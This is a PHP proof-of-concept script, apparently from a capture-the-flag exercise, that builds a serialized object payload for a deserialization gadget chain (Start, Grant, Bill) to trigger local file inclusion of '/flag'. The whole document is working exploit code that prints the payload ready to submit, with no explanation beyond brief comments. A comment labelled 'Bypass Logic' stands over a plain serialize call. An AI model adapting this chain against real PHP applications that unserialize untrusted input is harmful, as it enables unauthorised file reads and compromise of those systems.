<?php
class Bill {

    public $number='';
    public $card='';

    // Helper injected by UnSer Tool for POC generation
    public function __set_p_o_c($k, $v) { $this->$k = $v; }

}
class Grant {

    private $phone_number=10086;
    public $file;

    

    

    // Helper injected by UnSer Tool for POC generation
    public function __set_p_o_c($k, $v) { $this->$k = $v; }

}
class Start {

    public $name='cmcc';
    public $flag='/flag';

    

    

    // Helper injected by UnSer Tool for POC generation
    public function __set_p_o_c($k, $v) { $this->$k = $v; }

}


echo "Payload for Chain: Start::__wakeup -> Grant::__toString -> Bill::__get -> Bill::__invoke\n";

// 4. Invoke Object (Bill - Sink)
$sink_obj = new Bill();
$sink_obj->__set_p_o_c('number', '/flag'); // LFI Target

// 3. Get Object (Bill - Calls Invoke)
$get_obj = new Bill();
$get_obj->__set_p_o_c('card', $sink_obj); // $function = $this->card -> $sink_obj()

// 2. ToString Object (Grant - Calls Get)
$ts_obj = new Grant();
$ts_obj->__set_p_o_c('file', $get_obj); // Accessing prop on this triggers __get in Bill
// Access pattern: $this->file->fii1lennnaammee

// 1. Entry Object (Start)
$entry = new Start();
$entry->__set_p_o_c('name', $ts_obj);


// --- Bypass Logic ---
$data = serialize($entry);
echo $data;
?>